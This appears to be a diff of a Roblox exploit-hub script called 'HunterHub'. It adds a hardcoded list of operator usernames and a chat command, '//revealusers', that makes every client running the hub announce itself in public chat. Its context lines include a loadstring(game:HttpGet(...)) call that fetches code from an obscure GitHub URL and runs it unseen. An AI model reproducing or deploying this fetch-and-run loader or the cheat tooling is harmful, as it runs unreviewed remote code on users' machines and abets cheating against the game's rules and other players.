@@ -3231,3 +3231,57 @@ end
 coroutine.wrap(SXMOJB_fake_script)()
 ------------------------------
 loadstring(game:HttpGet('https://raw.githubusercontent.com/9879875atpzgegally2123451/8234809DaegunComPromt5345/refs/heads/main/34325DCP3423'))()
+------------------------------
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer
+
+local Admins = {
+	["QT_xAraa"] = true,
+	["Shot16kill"] = true,
+	["theoverrryou3_alt"] = true,
+	["Raiden_Nika"] = true,
+	["Brxy_Alt"] = true,
+	["GvessWholAm"] = true,
+	["Bowmbaclaat"] = true,
+	["FrostByte_074"] = true,
+	["Drenvoryth"] = true,
+	["Abayanjanzkie123"] = true,
+	["oMeekoMeeko"] = true,
+	["CyberSlayer_01"] = true,
+	["xxBattusaix_vc"] = true,
+	["ReaperXXenon"] = true,
+	["leenuena1"] = true,
+	["Supercrunch885"] = true,
+	["RoboRanger_471"] = true
+}
+
+local function ChatCommand(speakerName, message)
+	if not Admins[speakerName] then return end
+	message = message:lower()
+
+	if message:find("//revealusers") then
+		TextChatService.TextChannels.RBXGeneral:SendAsync("HunterHub v3.1.0")
+	end
+end
+
+TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(messageData)
+	local textSource = messageData.TextSource
+	if textSource then
+		local speaker = Players:GetPlayerByUserId(textSource.UserId)
+		if speaker then
+			ChatCommand(speaker.Name, messageData.Text)
+		end
+	end
+end)
+
+Players.LocalPlayer.Chatted:Connect(function(message)
+	local target, msg = message:match("^/w%s+(%w+)%s+(.+)")
+	if not target then
+		target, msg = message:match("^/whisper%s+(%w+)%s+(.+)")
+	end
+	if target and msg and Admins[LocalPlayer.Name] and target:lower() == LocalPlayer.Name:lower() then
+		ChatCommand(LocalPlayer.Name, msg)
+	end
+end)
